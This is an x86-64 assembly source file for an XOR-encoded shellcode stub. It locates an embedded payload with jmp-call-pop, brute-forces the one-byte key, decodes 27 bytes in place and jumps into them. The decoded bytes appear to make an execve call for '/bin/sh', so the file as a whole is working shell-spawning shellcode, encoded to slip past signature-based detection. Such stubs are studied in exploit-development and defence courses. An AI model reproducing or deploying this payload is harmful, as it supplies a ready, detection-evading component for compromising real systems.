global _start

section .text

_start:
   jmp find_address ; jmp short by default
decoder:
   ; Get the address of the string
   pop rdi
   push rdi
   pop rbx

   ; get the first byte and bruteforce till you get the token 0x90
   mov byte dl, [rdi]
   xor rdi,rdi ; key that will be incremented from 0x00 to 0xff
bruteforce:
   inc rdi
   mov al,dl
   xor al,dil
   cmp al,0x90
   jne bruteforce

   push 27 ; shellcode length (given by encoder)
   pop rcx
   mov al,dil
   push rbx
   pop rdi
decode:
   xor byte [rdi], al
   inc rdi
   loop decode

   jmp rbx ; jmp to decoded shellcode

find_address:
   call decoder
   encoded db 0x23,0xd9,0x88,0xeb,0x2a,0xe1,0xfb,0x08,0x9c,0x9c,0xd1,0xda,0xdd,0x9c,0xc0,0xdb,0xe0,0xe7,0xec,0xe1,0xe7,0xed,0xe4,0xe7,0xe9,0xbc,0xb6